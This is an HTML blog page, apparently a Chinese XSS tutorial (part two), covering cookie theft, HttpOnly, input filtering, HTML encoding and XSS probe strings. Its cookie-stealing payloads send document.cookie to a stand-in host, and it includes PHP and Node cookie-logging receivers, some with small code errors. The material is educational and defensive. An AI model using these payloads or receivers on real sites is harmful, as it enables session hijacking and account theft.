@@ -1,0 +1,457 @@
+<!DOCTYPE>
+<html>
+
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <!-- <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=yes" /> -->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+  <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+  <link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+ 
+
+  
+
+  <title>
+    
+    Web安全-浅谈Xss攻防（二） |
+    
+    浅笔墨画❀琐碎小记
+  </title>
+
+
+  
+  <link rel="icon" href="/images/favicon.png">
+  
+  
+  
+    <script>
+        (function(i,s,o,g,r,a,m){i["DaoVoiceObject"]=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;a.charset="utf-8";m.parentNode.insertBefore(a,m)})(window,document,"script",('https:' == document.location.protocol ? 'https:' : 'http:') + "//widget.daovoice.io/widget/0f81ff2f.js","daovoice")
+        daovoice('init', {
+            app_id: "862b4fbb"
+          });
+        daovoice('update');
+    </script>
+  
+
+  <link rel="stylesheet" href="/nayo.min.css">
+</head>
+
+<body>
+  <a href="https://www.github.com/okaychen" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewbox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true">
+      <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/>
+      <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/>
+      <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/>
+    </svg>
+  </a>
+  <style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+  
+  <header class="header">
+	
+  <nav class="header-nav">        
+
+    <span class="iconfont icon-menu mobile-toggle"></span>   	
+
+    <div class="header-logo">
+      <a href="/">
+        <img class="header-logo-img" src="/images/favicon.png">
+      </a>
+    </div>
+
+    <div class="header-menu">          
+              
+          
+            <a class="header-menu-link" id="header-menu-home" href="/" title="home">
+              <i class="iconfont icon-home">  
+            </i></a>
+          
+              
+          
+            <a class="header-menu-link" id="header-menu-archives" href="/archives" title="archives">
+              <i class="iconfont icon-archives">  
+            </i></a>
+          
+              
+          
+            <a class="header-menu-link" id="header-menu-tags" href="/tags" title="tags">
+              <i class="iconfont icon-tags">  
+            </i></a>
+          
+              
+          
+            <a class="header-menu-link" id="header-menu-eye" href="/lab" title="eye">
+              <i class="iconfont icon-eye">  
+            </i></a>
+          
+              
+          
+            <a class="header-menu-link" id="header-menu-about" href="/about" title="about">
+              <i class="iconfont icon-about">  
+            </i></a>
+          
+              
+          
+              <a class="header-menu-link" id="header-menu-search" title="search">
+                <i class="iconfont icon-search">  
+              </i></a>
+          
+                  
+    </div>  
+    
+  </nav>
+</header>
+
+
+
+  <div class="container">
+    
+    <section class="main">
+      
+
+        <article class="post">
+  
+	<div class="post-header">
+
+	<p class="post-title">	
+		web安全-浅谈xss攻防（二）
+	</p>
+			
+
+	<div class="meta-info">	
+		<span>
+			Oct 10, 2018
+		</span>
+		<span class="post-count"><i class="iconfont icon-posts"></i>字数统计1.8k字</span>
+		<span class="post-count" style="margin-top: 10px;"><i class="iconfont icon-eye"></i> 阅读时长预计7分钟</span>
+	</div>
+
+</div> 
+	 
+
+	  <div class="typo post-content slideDownMin">
+
+		
+
+			
+					<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>上次介绍了什么是XSS以及XSS的三种类型，作为上次小尾巴的总结来说：XSS跨站脚本是一种经常出现在web应用程序中的计算机安全漏洞，是由于web应用程序对于用户的输入过滤不足引起的。攻击者利用网站漏洞把恶意脚本代码注入到网页之中，当其他用户浏览这些网页时，就会执行其中的恶意代码，轻者能达到恶作剧的目的，重者可以对受害者采取cookie资料窃取，会话劫持，钓鱼欺骗等各种攻击；分为三种类型，服务端的存储型和反射性，客户端自身漏洞引起的DOM型。这次我简单总结一些常见的攻击对应的防御措施，方便以后学习回顾;<br><a id="more"></a></p>
+<h1 id="1-Cookie劫持"><a href="#1-Cookie劫持" class="headerlink" title="1.Cookie劫持"></a>1.Cookie劫持</h1><p>下面是几种是窃取用户Cookie信息的恶意代码，攻击者向漏洞页面写入类似的恶意代码从而达到获取客户端cookie信息的目的:</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.location=<span class="string">"http://test.com/cookie.asp?cookie ='+document.cookie</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://test.com/cookie.asp?cookie ='+document.cookie"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript"><span class="keyword">new</span> Image().src=<span class="string">"http://test.com/cookie.asp?cookie ='+document.cookie"</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">img=<span class="keyword">new</span> Image();img.src=<span class="string">"http://test.com/cookie.asp?cookie ='+document.cookie"</span>;img.wdith=<span class="number">0</span>;img.height=<span class="number">0</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml">document.write('<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://test.com/cookie.asp?cookie ='+document.cookie"</span> <span class="attr">width</span>=<span class="string">0</span> <span class="attr">height</span>=<span class="string">0</span> <span class="attr">border</span>=<span class="string">0</span>&gt;</span>')</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>诸如此类，一旦注入成功，这些恶意代码都会向某个特定的远程服务器提交cookie，攻击者会在远程服务器上写一个接收和记录cookie信息的文件<br>例如php版本：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $cookie=$_GET[<span class="string">'cookie'</span>];</span><br><span class="line">    $log= fopen(<span class="string">"cookie.txt"</span>,<span class="string">"a"</span>);</span><br><span class="line">    fwrite($log,$cookie .<span class="string">"\n"</span>);</span><br><span class="line">    fclose($log);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>或者node来处理:<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"></span><br><span class="line">http.createServer(<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> Cookies = &#123;&#125;;</span><br><span class="line">    </span><br><span class="line">    req.headers.cookie &amp;&amp; req.headers.cookie.split(<span class="string">';'</span>).foEach(<span class="function"><span class="keyword">function</span>(<span class="params">Cookies</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> parts = Cookie.split(<span class="string">'='</span>);</span><br><span class="line">        Cookies[ parts[ <span class="number">0</span> ].trim() ] = ( parts[ <span class="number">1</span> ] || <span class="string">''</span> ).trim();</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">console</span>.log(Cookies)</span><br><span class="line"></span><br><span class="line">    res.writeHeader(<span class="number">200</span>,&#123;</span><br><span class="line">        <span class="string">'Set-Cookie'</span> : <span class="string">'SSID=EqAc1D; Expires=Wed'</span>, </span><br><span class="line">        <span class="comment">// 注意上面我们不设置HttpOnly;Fix:&gt;&gt;&gt;'SSID=EqAc1D; Expires=Wed;HttpOnly'&lt;&lt;&lt;</span></span><br><span class="line">		<span class="string">'Content-Type'</span> : <span class="string">'text/plain'</span></span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    fs.open(<span class="string">'cookie.txt'</span>,<span class="string">'r+'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">err,fd</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(err)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">console</span>.error(err);</span><br><span class="line">        &#125;</span><br><span class="line">        fs.writeFile(fd,Cookies,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(err)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">console</span>.error(err);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;).listen(<span class="number">8000</span>);</span><br></pre></td></tr></table></figure></p>
+<p>亦或是jsp版本、python flask等等诸如此类可以获取到从客户端发来的cookie做接收和记录操作的。</p>
+<p>获取到存储信息的cookie.txt后，攻击者就可以通过修改网站的cookie信息（f12打开开发者控制工具，application/Cookies）来登入网站，从而来进行进一步的攻击操作。</p>
+<h2 id="防止cookie会话劫持"><a href="#防止cookie会话劫持" class="headerlink" title="防止cookie会话劫持"></a>防止cookie会话劫持</h2><p>根本原因是攻击者获取cookie的恶意js代码注入到站点，进一步传到攻击者的远程服务器，从而进行攻击操作；<br>对于可能的意外注入站点的获取cookie的恶意js代码，我们一般要在设置cookie时加HttpOnly，来禁止意外注入站点的恶意js代码操作Cookie造成xss攻击<br>比如node设置HttpOnly：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">'Set-Cookie'</span> : <span class="string">'SSID=EqAc1D; Expires=Wed ;HttpOnly'</span></span><br></pre></td></tr></table></figure></p>
+<p>或者php设置HttpOnly：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> ini_set(<span class="string">"session.cookie_httponly"</span>, <span class="number">1</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<h1 id="2-提高攻击门槛"><a href="#2-提高攻击门槛" class="headerlink" title="2.提高攻击门槛"></a>2.提高攻击门槛</h1><h2 id="使用XSS-Filter"><a href="#使用XSS-Filter" class="headerlink" title="使用XSS Filter"></a>使用XSS Filter</h2><p>针对用户提交的数据进行有效的验证，只接受我们规定的长度或内容的提交，过滤掉其他的输入内容，例如：<br>1.表单数据指定值的类型：年龄只能是 int 、name 只能是字母数字等<br>2.过滤或移除特殊的 html 标签：<code>&lt;script&gt;</code>、<code>&lt;iframe&gt;</code>等<br>3.过滤 js 事件的标签：onclick、onerror、onfocus等<br>4.对于要求用户输入的一些特殊格式的字段，用正则和字段长度进行严格限制，比如手机号，邮箱等<br>如在客户端进行验证手机号的JavaScript代码:<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;form id=<span class="string">"test"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"text"</span> id=<span class="string">"tel"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"button"</span> onclick=<span class="string">"checkTel()"</span>&gt; </span><br><span class="line">&lt;<span class="regexp">/form&gt;</span></span><br><span class="line"><span class="regexp">&lt;script&gt;</span></span><br><span class="line"><span class="regexp">    function()&#123;</span></span><br><span class="line"><span class="regexp">        let re = /</span>^<span class="number">020</span>-\d&#123;<span class="number">8</span>&#125;$/;</span><br><span class="line">        <span class="keyword">if</span>(re.test(<span class="built_in">document</span>.getElementById(<span class="string">"Tel"</span>).value))&#123;</span><br><span class="line">            alert(<span class="string">'电话号码格式正确'</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            alert(<span class="string">'错误的电话号码'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>这段JavaScript验证代码要求用户输入的必须是020-开头，后跟8位数字.</p>
+<blockquote>
+<p>但是需要特别注意的是，<em>仅仅在客户端进行非法输入的验证和检测是远远不够的</em>，因为客户端组件和用户输入不在服务器的控制范围内，用户能够完全控制客户端及提交的数据，比如firebug、TemperDate之类的工具，拦截应用程序收到和发布每一个HTTP/HTTPS请求和响应，对其进行修改和检查，从而绕过客户端的检验将信息提交到服务器中。因此，确认客户端生成数据的唯一安全方法就是在服务端实施保护措施。</p>
+</blockquote>
+<h2 id="输出编码Xss-Escape"><a href="#输出编码Xss-Escape" class="headerlink" title="输出编码Xss Escape"></a>输出编码Xss Escape</h2><p>有时候我们又不可避免的需要用户输入一些特殊字符，但是我们又不确定用户输入的这段含特殊字符的数据是不是恶意的含xss的字符，为了保证用户输入的完整性和正确性，就可以使用编码（HTMLEncode）进行处理。</p>
+<p>HTML编码在防止xss攻击上能起很大的作用，它主要使用对应的实体代替HTML字符，让该字符作为其HTML文档的内容而非结构加以处理。</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">显示</th>
+<th style="text-align:center">实体名字</th>
+<th style="text-align:center">实体编号</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center"><code>&lt;</code></td>
+<td style="text-align:center"><code>&amp;lt;</code></td>
+<td style="text-align:center"><code>&amp;#60;</code></td>
+</tr>
+<tr>
+<td style="text-align:center"><code>&gt;</code></td>
+<td style="text-align:center"><code>&amp;gt;</code></td>
+<td style="text-align:center"><code>&amp;#62;</code></td>
+</tr>
+<tr>
+<td style="text-align:center"><code>&amp;</code></td>
+<td style="text-align:center"><code>&amp;amp;</code></td>
+<td style="text-align:center"><code>&amp;#38;</code></td>
+</tr>
+<tr>
+<td style="text-align:center"><code>&quot;</code></td>
+<td style="text-align:center"><code>&amp;quot;</code></td>
+<td style="text-align:center"><code>&amp;#34;</code></td>
+</tr>
+</tbody>
+</table>
+<p>上面就是几个可能触发xss的敏感字符，都是一些特殊的HTML字符。都这些字符实现编码和转义后，能够有效地防范HTML注入和XSS攻击</p>
+<p>例如php的<code>htmlspecialchars()</code>库函数，就能够将用户输入的特殊字符进行实体转换：</p>
+<ul>
+<li><code>&lt;</code> 转成 <code>&amp;lt;</code></li>
+<li><code>&gt;</code> 转成 <code>&amp;gt;</code></li>
+<li><code>&amp;</code> 转成 <code>&amp;amp;</code></li>
+<li><code>&quot;</code> 转成 <code>&amp;quot;</code></li>
+<li><code>&#39;</code> 转成 <code>&amp;#39;</code></li>
+</ul>
+<p>实际情况中，我们可以结合这两种情况进行过滤<br><img src="/assets/images/xss-encode02.png" alt="安全的过滤形式"></p>
+<h1 id="3-Xss漏洞检测Poc"><a href="#3-Xss漏洞检测Poc" class="headerlink" title="3.Xss漏洞检测Poc"></a>3.Xss漏洞检测Poc</h1><p>标准的xss漏洞检测代码<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">'xss'</span>)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>img 图片标记属性跨站攻击代码<br><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">"javascript:alert(/xss/)"</span>&gt;&lt;/img&gt; &lt;img <span class="attribute">dynsrc</span>=<span class="string">"javascript:alert('xss')"</span>&gt;</span><br></pre></td></tr></table></figure></p>
+<p>无需 “&lt;&gt;”，利用 html 标记事件属性跨站<br><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">""</span> <span class="attribute">onerror</span>=alert("xss")&gt;</span><br></pre></td></tr></table></figure></p>
+<p>空格与回车符转换<br><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">"Jav&amp;#x09;ascript:alert('xss')"</span>&gt; &lt;img <span class="attribute">src</span>=<span class="string">"Jav&amp;#x0A;ascript:alert('xss')"</span>&gt; &lt;img <span class="attribute">src</span>=<span class="string">"Jav&amp;#x0D;ascript:alert('xss')"</span>&gt;</span><br></pre></td></tr></table></figure></p>
+<p>10 进制转换<br><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">"&amp;#74&amp;#97&amp;#118&amp;#97&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116&amp;#58&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116&amp;#40&amp;#39&amp;#120&amp;#115&amp;#115&amp;#39&amp;#41"</span>&gt;</span><br></pre></td></tr></table></figure></p>
+<p>以上代码都可以做 Poc 使用，在有变量的位置插入，如果成功执行则代表有漏洞。<br>只要你提交的Poc，服务端原封不动的返回了，说明服务端不经过任何处理就显示了，就证明有漏洞存在。</p>
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://book.douban.com/subject/25711796/" target="_blank" rel="noopener">《XSS跨站脚本剖析与防御》–邱永华</a><br><a href="https://book.douban.com/subject/10546925/" target="_blank" rel="noopener">《白帽子讲web安全》–吴翰清</a><br><a href="https://blog.csdn.net/gitchat/article/details/78726803" target="_blank" rel="noopener">《Web 安全：前端攻击 XSS 深入解析》</a></p>
+  	
+				
+			
+			<div id="MySignature" style="display: block;"><div id="Copyright">
+				<p class="com">
+				您的关注和支持是我写作的最大动力~ <br>
+				出处：<a href="http://www.chenqaq.com/" target="_blank">http://www.chenqaq.com</a><br>
+				github：<a target="_blank" href="https://github.com/okaychen">https://github.com/okaychen</a>
+				<br>
+				Web技术更新很快，本站很多文章都具有时效性，我会及时更新原文，持续和大家分享，除去特殊注明外，均为作者原创，采用更开放的「署名 4.0 国际（CC BY 4.0）」创作共享协议。欢迎大家转载，转载时请保留文章最后的出处，如若标注「原创」请先与本人取得联系
+				</p>
+				
+				</div></div>
+	  </div>     
+	  
+
+	<div class="post-footer">
+
+  <div class="post-footer-other">
+      <span class="post-footer-item">
+        
+
+
+
+
+<span class="donate-btn">
+	<span class="iconfont icon-donate"></span>
+</span>
+
+
+<div id="donate-box" class="sildeUpMin">
+
+	<span class="donate-cancel iconfont icon-cancel"></span>
+
+	<div class="donate-img-box">
+		<img id="donate-qr-wechat" class="noLazyLoad donate-img" src="/" alt="No Donate Image!">	
+		<img id="donate-qr-alipay" class="noLazyLoad donate-img" src="/" alt="No Donate Image!">	
+	</div>
+
+	<span class="donate-word">世界美好 你也是</span>
+
+	<div class="donate-list">
+		<span class="iconfont icon-donate-wechat"></span>
+		<span class="iconfont icon-donate-alipay"></span>
+	</div>
+
+</div>
+
+ 
+      </span>           
+      <span class="post-footer-item">
+        
+	
+<script id="-mob-share" src="http://f1.webshare.mob.com/code/mob-share.js?appkey=21d601593a1de"></script>
+	
+	<span class="share-btn">
+	<span class="iconfont icon-share"></span>
+	</span>
+
+
+	<div class="-mob-share sildeUpMin">
+		<div class="-mob-inner">
+		   			             
+            <a class="iconfont icon-share-qq -mob-share-link"></a>		
+     	   			             
+            <a class="iconfont icon-share-weixin -mob-share-link"></a>		
+     	   			             
+            <a class="iconfont icon-share-weibo -mob-share-link"></a>		
+     	   			             
+            <a class="iconfont icon-share-douban -mob-share-link"></a>		
+     	   			             
+            <a class="iconfont icon-share-facebook -mob-share-link"></a>		
+     	   			             
+            <a class="iconfont icon-share-twitter -mob-share-link"></a>		
+     	   			             
+            <a class="iconfont icon-share-google -mob-share-link"></a>		
+     	   
+		</div>
+	</div>	
+
+      </span>           
+  </div>  
+
+  <div class="post-footer-meta">
+        
+          <i class="iconfont icon-category"></i>       
+          <a class="category-link" href="/categories/xss/">xss</a> 	
+      
+        	
+
+        
+          <i class="iconfont icon-tag"></i>     
+            <a class="tag-link" href="/tags/web安全/">web安全</a> <a class="tag-link" href="/tags/xss/">xss</a>    
+        	
+  </div>
+
+</div>
+
+
+<nav class="post-footer-nav">
+  
+    <div class="post-footer-link">
+      <a href="/2018/10/18/js-higherOrderFn-DecoratorPatternToAOP1/" id="post-nav-newer" class="post-nav-link-wrap">
+        <strong class="post-nav-caption">newer</strong>
+           
+          <a class="post-nav-title" href="/2018/10/18/js-higherOrderFn-DecoratorPatternToAOP1/">
+          用AOP装饰函数-摸索篇</a>
+      </a>
+    </div>
+  
+  
+    <div class="post-footer-link">
+      <a href="/2018/10/09/xss-attack-defense-md/" id="post-nav-older" class="post-nav-link-wrap">
+        <strong class="post-nav-caption">older</strong>
+        
+          <a class="post-nav-title" href="/2018/10/09/xss-attack-defense-md/">
+          web安全-浅谈xss攻防（一）</a>
+      </a>
+    </div>
+  
+</nav>
+ 
+	
+	
+</article>
+
+      </section>
+  </div>
+
+  <a id="backTop">
+    <span>
+      <i class="iconfont icon-backtotop"></i>
+    </span>
+  </a>
+
+
+  
+    <div class="search-container sildeUpMin">
+        <div class="search-header">
+            <input type="text" placeholder="输入你想搜索的" id="search-input" class="search-input">
+            <span class="search-cancel">
+                <i class="iconfont icon-cancel">
+            </i></span>
+        </div>
+        <div id="search-result" class="search-result"></div>
+    </div>
+ 
+   <div class="mobile-menu">      
+
+      
+      <img class="mobile-menu-icon" src="/images/favicon.png">   
+      
+
+         
+            
+
+            <a class="mobile-menu-link" href="/">首頁
+            </a>
+            
+         
+            
+
+            <a class="mobile-menu-link" href="/archives">歸檔
+            </a>
+            
+         
+            
+
+            <a class="mobile-menu-link" href="/tags">標籤
+            </a>
+            
+         
+            
+
+            <a class="mobile-menu-link" href="/lab">Menu.eye
+            </a>
+            
+         
+            
+
+            <a class="mobile-menu-link" href="/about">關於
+            </a>
+            
+         
+                          
+
+            <a class="mobile-menu-link mobile-menu-search" href="#">搜索 </a>                 
+            
+         
+      
+</div>
+  
+
+
+
+
+  
+
+
+<footer id="footer">
+
+
+	<div class="footer-copyright">
+		<div>
+			<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+			<script>
+				var now = new Date();
+
+				function createtime() {
+					var grt = new Date("12/05/2017 00:00:00"); //此处修改你的建站时间或者网站上线时间 
+					now.setTime(now.getTime() + 250);
+					days = (now - grt) / 1000 / 60 / 60 / 24;
+					dnum = Math.floor(days);
+					hours = (now - grt) / 1000 / 60 / 60 - (24 * dnum);
+					hnum = Math.floor(hours);
+					if (String(hnum).length == 1) {
+						hnum = "0" + hnum;
+					}
+					minutes = (now - grt) / 1000 / 60 - (24 * 60 * dnum) - (60 * hnum);
+					mnum = Math.floor(minutes);
+					if (String(mnum).length == 1) {
+						mnum = "0" + mnum;
+					}
+					seconds = (now - grt) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+					snum = Math.round(seconds);
+					if (String(snum).length == 1) {
+						snum = "0" + snum;
+					}
+					document.getElementById("timeDate").innerHTML = "本站已安全运行 " + dnum + " 天 ";
+					document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+				}
+				setInterval("createtime()", 250);
+			</script>
+		</div>
+
+		<span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+		&copy;
+		
+		2017-
+		
+		2019
+
+		<a href="https://github.com/okaychen" target="_blank">
+			okaychen
+		</a>
+
+	</div>
+
+</footer>
+
+
+  <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;"></canvas>
+  <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script>
+  <script type="text/javascript" src="/clicklove.js"></script>
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  <script src="/nayo.bundle.js"></script>
+</body>
+
+</html>
